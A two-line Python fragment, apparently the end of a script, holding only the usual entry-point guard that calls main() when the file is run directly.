if __name__ == "__main__":
    main()
